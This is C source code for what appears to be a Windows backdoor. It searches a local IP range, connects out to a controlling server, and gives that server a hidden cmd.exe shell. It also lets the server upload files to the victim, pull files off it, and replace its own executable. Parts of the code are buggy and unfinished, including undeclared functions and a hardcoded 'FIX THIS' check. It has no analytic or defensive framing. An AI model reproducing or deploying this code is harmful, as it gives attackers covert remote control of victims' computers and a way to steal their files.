#include <stdio.h>
#include <string.h>
#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>

//Funtions
int main(void);
int runCommand(void);
int exploit(void);
int replacechar(char *ix, char orig, char rep);
DWORD WINAPI connectThread(void);
BOOL DirectoryExists(LPCTSTR szPath);
int runSingleCommand(char *baseCommand);

//Variables For Running Commands
#define BUFSIZE 60
char command[1000];
char fullOutput[50000];
char finalCommand[300];

//Directories
BOOL dirExists;
char directory[150] = "C:/";
char tempDirectory[150] = "C:/";

//Create Handles
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

//Variables For Threads
HANDLE outputThread;
DWORD WINAPI readOutput(void);
int ThreadResponse;

//Socket
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
SOCKET client = INVALID_SOCKET;
int returnData;
struct addrinfo *result = NULL,
				*ptr = NULL,
				hints;
unsigned int returnValue;
int bottomAddress = 60;
int topAddress = 80;
int postaddress;
char postbuff[5];
char preaddress[18] = "192.168.1.";
char address[25];
char port[] = "27015";

//File Editing
char fileBuffer[30];
char reciveCode;

//Other Variables
char path[MAX_PATH];
char *appName;


//Create Window
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow) {	
	
	main();
}

//Main
int main(void) {

	
	//Get Program Path
	int diffrence = 1;
	GetModuleFileName(NULL, path, MAX_PATH);
	for (int x = 1; x < MAX_PATH; x +=1) {
		path[x] = path[x + diffrence];
		if (path[x -3] == '.' & path[x - 2] == 'e' & path[x - 1] == 'x' & path[x] == 'e') {
			path[x + 1] = '\0';
			break;
		}
		diffrence++;
	}

	
	
	
	
	
	
	
	//Get Program Name
	appName = strchr(path, '\\');
	while (appName != NULL)
	{
		if (strchr(appName + 1, '\\') == NULL) {
			break;
		}
		appName = strchr(appName + 1, '\\');
	}
	appName += 1;
	printf("Path Is: %s\n%s %d \n", path,appName, strlen(appName));
	//For Safety
	//Sleep(15000);
	
	postaddress = bottomAddress;

	//Initialize WSA
	WSADATA wsa;
	returnData = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (returnData != 0) {
		//Failed To Initialize WSA
	}
	else {

		//Setup For Socket
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		//Connect To IP
		for (; ;) {

			//Change IP
			strcpy_s(address, sizeof(address), preaddress);
			postaddress++;
			if (postaddress == topAddress) {
				postaddress = bottomAddress;
			}
			_itoa(postaddress, postbuff, 10);
			strcat_s(address, sizeof(address), postbuff);
			
			//Pings if Address Exits	
			returnData = getaddrinfo(address, port, &hints, &result);

			if (returnData == 0) {

				//Found Sutible IP
				for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
					printf("%s\n", address);

					//Create Socket For Connection
					client = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

					//Trys To Connect To Server with Thread
					HANDLE thread = CreateThread(NULL, 0, connectThread, NULL, 0, NULL);
					Sleep(200);
					TerminateThread(thread, 0);
					GetExitCodeThread(thread, &returnValue);
					if (returnValue == 0) {
						exploit();
						client = INVALID_SOCKET;
					}

				}
			}
		}
	}
}

//Exploit
int exploit() {

	//Initialize Variables
	int buffSize = 100000;
	int commandResult = 0;
	char rawmessage[100010];
	char *message = (char *)malloc(100);

	// Receive until the peer closes the connection
	do {
		returnData = recv(client, rawmessage, buffSize, 0);
		if (returnData > 0) {

			//Got Message
			message = (char *)realloc(message, returnData + 1);
			strcpy_s(message, returnData + 1, rawmessage);
			printf("%s\n",message);

			//Receving File
			if (strncmp(message, "_Prepare_For_File_Upload_ ", 26) == 0) {

				//Variables
				FILE *uploadedFile;
				char fileLocation[100];

				//Get File Name
				memmove(message, message + 26, strlen(message));
				strcpy_s(fileLocation, sizeof(fileLocation), directory);
				strcat_s(fileLocation, sizeof(fileLocation), "/");
				strcat_s(fileLocation, sizeof(fileLocation), message);

				//Open File
				fopen_s(&uploadedFile,fileLocation, "wb");

				if (uploadedFile) {
					//Recive File
					for (; ;) {
						returnData = recv(client, fileBuffer, sizeof(fileBuffer), 0);
						if (strncmp(fileBuffer, "DONE_SEND_", 10) == 0) {
							break;
						}
						fwrite(fileBuffer, 1, returnData, uploadedFile);
					}
					fclose(uploadedFile);
				}

				else {

					//Cannot Edit File
					for (; ;) {
						returnData = recv(client, fileBuffer, sizeof(fileBuffer), 0);
						if (strncmp(fileBuffer, "DONE_SEND_", 10) == 0) {
							break;
						}
					}
				}
				continue;
			}

			//Send File
			else if (strncmp(message, "_Prepare_For_Download_ ", 21) == 0) {

				//File Location
				char fileLocation[100];

				//Get File Name
				memmove(message, message + 23, strlen(message));
				strcpy_s(fileLocation, sizeof(fileLocation), directory);
				strcat_s(fileLocation, sizeof(fileLocation), "/");
				strcat_s(fileLocation, sizeof(fileLocation), message);
				//Open File
				FILE *fileUpload;
				fopen_s(&fileUpload, fileLocation, "rb");

				//Check if File Exists
				if (fileUpload) {
					send(client, "Downloading", 12, 0);
				}
				else {
					send(client, "File Not Found\n", 16, 0);
					continue;
				}

				int bytesRead = 1;

				//Read File
				while (!feof(fileUpload))
				{
					memset(fileBuffer, 0, strlen(fileBuffer));
					bytesRead = fread(fileBuffer, sizeof(fileBuffer), 1, fileUpload);
					send(client, fileBuffer, sizeof(fileBuffer), 0);
					recv(client, reciveCode, 2, 0);

				}
				send(client, "DONE_SEND_", 11, 0);
				fclose(fileUpload);
				continue;
			}

			//Receving File
			if (strncmp(message, "_Prepare_For_Update_", 20) == 0) {

				//Variables
				FILE *uploadedFile;
				char fileLocation[100];
				int difference = 0;

				
				//char *applicationName = strrchr(string, '\\') + 1;
				//printf("\n%s\n", applicationName);
				//Open File
				fopen_s(&uploadedFile, ".exe", "wb");

				if (uploadedFile) {
					//Recive File
					for (; ;) {
						returnData = recv(client, fileBuffer, sizeof(fileBuffer), 0);
						if (strncmp(fileBuffer, "DONE_SEND_", 10) == 0) {
							break;
						}
						fwrite(fileBuffer, 1, returnData, uploadedFile);
					}
					fclose(uploadedFile);
				}

				else {

					//Cannot Edit File
					for (; ;) {
						returnData = recv(client, fileBuffer, sizeof(fileBuffer), 0);
						if (strncmp(fileBuffer, "DONE_SEND_", 10) == 0) {
							break;
						}
					}
				}
				
				strcpy_s(command, sizeof(command) + 1, "timeout 1 & del ");
				
				strcat_s(command, sizeof(command), " & rename .exe ");
				printf("\n\n%s\n\n", appName);
				//strcat_s(command, sizeof(command), appName);
				printf("\n\n%s\n\n", command);

			}			
				
			
			//Change Directory
			else if (strncmp(message, "cd", 2) == 0) {
				
				if (strncmp(message, "cd\0", 3) == 0) {
					send(client, directory, strlen(directory) + 1, 0);
					continue;
				}

				strcpy_s(tempDirectory, sizeof(tempDirectory), directory);

				memmove(message, message + 3, strlen(message));
				replacechar(message, '\\', '/');


				if (strstr(message, "/") != NULL) {
					strcpy_s(directory, sizeof(directory), message);
				}

				else if (strcmp(message, "..") == 0) {
					char spiltDir[150];
					strcpy(spiltDir, directory);
					char* pch = NULL;
					char last[30];

					pch = strtok(spiltDir, "/");

					while (pch != NULL)
					{
						strcpy_s(last, sizeof(last), pch);
						pch = strtok(NULL, "/");
					}
					directory[(strlen(directory) - strlen(last) - 1)] = '\0';
				}

				else {
					strcat_s(directory, sizeof(directory), "/");
					strcat_s(directory, sizeof(directory), message);
				}
				
				//Checks If Exists
				dirExists = DirectoryExists(directory);
				printf("%s                     %d\n", directory, dirExists);
				
				//FIX THIS
				dirExists = TRUE;
				if (dirExists == TRUE) {
					send(client, "Directory Changed Successfully\n\0", 33, 0);
				}
				else {
					send(client, "Directory Does Not Exist\n\0", 27, 0);
					strcpy_s(directory, sizeof(directory), tempDirectory);
				}
			}
			
			//Run Dos Command
			else if (strncmp(message, "shell", 5) == 0){
				createShell();
				for(;;){
					
					returnData = recv(client, rawmessage, buffSize, 0);
					if (returnData > 0) {
						//Got Message
						strcpy_s(command, returnData + 1, rawmessage);
						runCommand();
						if(strncmp(command,"exit\n",5) == NULL){
							WriteFile(g_hChildStd_IN_Wr, "exit & exit\n", 12, NULL, NULL);
							closeShell();
							break;
						}
					}
					else{
						//Close Proccess
						WriteFile(g_hChildStd_IN_Wr, "exit & exit\n", 12, NULL, NULL);
						closeShell();
						break;
					}
				}
			}
		}

		else if (returnData == 0) {
			//Server Closed Conection
			return 0;
		}
		else {
			//Lost Connection
			return 0;
		}

	} while (returnData > 0);
	return 0;
}

//Run Simple Command Without Output
int runSingleCommand(char *baseCommand) {

	//Variables
	char endCommand[1000];
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;

	//Set Up Variables
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));

	//Format Command
	strncpy(endCommand, " /k ", sizeof endCommand);
	strncat(endCommand, baseCommand, sizeof endCommand);
	strncat(endCommand, " & exit & exit", sizeof endCommand);
	char *pointerCommand = (char *)endCommand;

	//Run Command
	CreateProcess(
		TEXT("C:\\Windows\\System32\\cmd.exe"),
		pointerCommand,
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&siStartInfo,
		&piProcInfo);
}

//Create Shell
int createShell(){
	
	//Variables
	PROCESS_INFORMATION piProcInfo; 
    STARTUPINFO siStartInfo;
	SECURITY_ATTRIBUTES saAttr; 
	
	g_hChildStd_IN_Rd = NULL;
	g_hChildStd_IN_Wr = NULL;
	g_hChildStd_OUT_Rd = NULL;
	g_hChildStd_OUT_Wr = NULL;

	// Set the bInheritHandle flag so pipe handles are inherited. 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL; 

	// Create a pipe for the child process's STDOUT. 
    CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);

	// Ensure the read handle to the pipe for STDOUT is not inherited.
    SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

	// Create a pipe for the child process's STDIN. 
    CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);

	// Ensure the write handle to the pipe for STDIN is not inherited. 
    SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
   
	//Clear Memory
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION)); 
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
   
    //Create Handles
    siStartInfo.cb = sizeof(STARTUPINFO); 
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
	// Create the child process. 
    CreateProcess(
		TEXT("C:\\Windows\\System32\\cmd.exe"),		// app to run
		TEXT(" /k "),								// command line argument
		NULL,                         				// process security attributes 
		NULL,                         				// primary thread security attributes 
		TRUE,                         				// handles are inherited 
		CREATE_NO_WINDOW,            			    // creation flags 
		NULL,                        			    // use parent's environment 
		NULL,                         				// use parent's current directory 
		&siStartInfo,                 				// STARTUPINFO pointer 
		&piProcInfo);                 				// receives PROCESS_INFORMATION 
	
	outputThread = CreateThread(NULL, 0, readOutput, NULL, 0, NULL);
}

//Close Shell
int closeShell(){
	TerminateThread(outputThread, 0);
	CloseHandle(g_hChildStd_IN_Rd);
	CloseHandle(g_hChildStd_IN_Wr);
	CloseHandle(g_hChildStd_OUT_Rd);
	CloseHandle(g_hChildStd_OUT_Wr);
	
}

//Run Command On Shell
int runCommand(){
	
	//Format Command
	strcpy_s(finalCommand, sizeof(finalCommand), command);	
	char *newCommand = (char *) finalCommand;
	printf("\nRunning Command : %s\n\n",finalCommand);
	//Run Command
	WriteFile(g_hChildStd_IN_Wr, newCommand, strlen(finalCommand), NULL, NULL);
}

//Thread For Reading Output
DWORD WINAPI readOutput(void) {
	CHAR chBuf[BUFSIZE];
	
	//Constantly Read
	for (;;)
	{
		memset(chBuf, 0, sizeof(chBuf));
		ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE - 1, NULL, NULL);
		if (strncmp(chBuf, finalCommand, strlen(finalCommand)) == NULL){
			if(strlen(finalCommand) > 0){
				continue;
			}
		}
		
		//Got Output
		send(client, chBuf, 60, 0);
		printf("%s",chBuf);
	}
}

//Thread For Conecting
DWORD WINAPI connectThread(void) {

	//Try To Connect
	returnData = connect(client, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (returnData != SOCKET_ERROR) {
		//Successfully Connected
		return 0;
	}
}

//Replace Characters
int replacechar(char *ix, char orig, char rep) {
	while ((ix = strchr(ix, orig)) != NULL) {
		*ix++ = rep;
	}
}

//Check If Directory Exists
BOOL DirectoryExists(LPCTSTR szPath)
{
	DWORD dwAttrib = GetFileAttributes(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}